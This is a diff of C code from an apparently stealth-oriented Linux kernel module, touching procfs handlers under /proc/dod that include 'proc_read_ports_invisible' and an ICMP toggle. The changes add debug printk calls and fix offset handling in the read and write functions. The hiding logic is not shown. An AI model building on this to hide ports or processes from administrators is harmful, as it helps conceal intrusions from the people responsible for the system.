@@ -748,6 +748,8 @@ ssize_t proc_read_ports_invisible(struct file *file,  char* buf, size_t size, lo
     uint16_t *pval;
     int len;
 
+    printk(KERN_ERR "Size: %li, offset: %lli", size, *offset);
+
     // Nope
     if (*offset > 0) goto exit;
 
@@ -767,6 +769,7 @@ ssize_t proc_read_ports_invisible(struct file *file,  char* buf, size_t size, lo
 
     // All good
     kfree(pbuf);
+    printk(KERN_ERR "Len :%i", len);
     return len;
 
     
@@ -824,7 +827,10 @@ exit:
  * Read /proc/dod/ipv4/icmp
  */
 ssize_t proc_read_ipv4_icmp(struct file *file, char *userbuf, size_t len, loff_t *offset) {
-   return proc_read_int(userbuf, len, offset, icmp_enabled);
+    ssize_t ret;
+   ret = proc_read_int(userbuf, len, offset, icmp_enabled);
+   printk(KERN_ERR "Ret icmp: %li, offset: %lli", ret, *offset);
+   return ret;
 }
 
 /**
@@ -908,8 +914,8 @@ ssize_t proc_write_char(const char *buf, size_t size, loff_t *offset, char *dest
     char linebuf[SETTING_BUF_SIZE] = {0};
     size_t len;
 
+    if (*offset > 0) goto no_write;
     len = min(size, sizeof(linebuf) - 1);
-    if (*offset > 0) goto exit;
 
     if (copy_from_user(linebuf, buf, len) != 0) {
 #ifdef DOD_DEBUG
@@ -929,10 +935,12 @@ ssize_t proc_write_char(const char *buf, size_t size, loff_t *offset, char *dest
 
 exit:
     return len;
+no_write:
+    return 0;
 }
 
 /**
- * Generic write operation for int datatypes
+ * Generic read operation for int datatypes
  */
 ssize_t proc_read_int(char* buf, size_t size, loff_t* offset, int src) {
     char linebuf[PROCFS_LINEBUF_SIZE];
@@ -961,8 +969,8 @@ ssize_t proc_write_int(const char *buf, size_t size, loff_t *offset, int *dest, 
     size_t len;
     int result;
    
+    if (*offset > 0) goto no_write;
     len = min(size, sizeof(linebuf) - 1);
-    if (*offset > 0) goto exit;
    
     if (copy_from_user(linebuf, buf, len) != 0) {
 #ifdef DOD_DEBUG
@@ -994,8 +1002,9 @@ ssize_t proc_write_int(const char *buf, size_t size, loff_t *offset, int *dest, 
     }
 
 exit:
-   
     return len; 
+no_write:
+    return 0;
 }
 
 /**
